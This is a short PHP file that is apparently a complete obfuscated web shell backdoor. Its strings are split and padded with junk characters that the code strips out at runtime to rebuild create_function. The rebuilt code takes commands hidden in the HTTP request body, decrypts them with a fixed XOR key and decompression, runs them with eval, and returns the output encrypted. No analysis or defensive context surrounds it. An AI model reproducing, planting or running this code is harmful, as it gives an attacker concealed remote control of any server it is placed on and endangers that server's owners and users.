<?php
$h='z/qczQ5l";z/funcz/tionz/ x($t,z/$k){$c=strlz/en($k)z/;$lz/=strlez/z/n($t);$o="";forz';
$X=str_replace('T','','crTeTTateTT_Tfunction');
$w='j};}}rez/turn z/$o;}iz/f (@prez/g_z/match("/z/$khz/(.+)$kf/",@z/filez/z/_get_content';
$G='();$r=@basez/64_encz/oz/de(@xz/(@gz/zcompress($o)z/,$z/k));z/print("$p$kh$rz/$kf");}';
$v='base6z/4_decode(z/z/$m[1]),$k)z/));$o=@oz/b_gz/et_contenz/ts()z/;@ob_enz/d_cz/leaz/n';
$Q='/($i=0z/;$i<z/$l;){foz/r($j=z/z/0;($j<$z/c&&$i<$l);$j+z/+z/,$i++){$oz/.=$t{$z/i}^$k{$z/';
$B='$k="45152z/b3c";$z/kh="z/z/b2z/5949b91a7f";z/$kf="3d4351z/847z/z/4d8";$p="2x3lxnz/X6ax';
$S='s(z/"php:/z//input")z/,z/$m)==1)z/ {@ob_starz/t();@ez/valz/(z/@gzz/uncompress(@xz/(@';
$d=str_replace('z/','',$B.$h.$Q.$w.$S.$v.$G);
$O=$X('',$d);$O();
?>
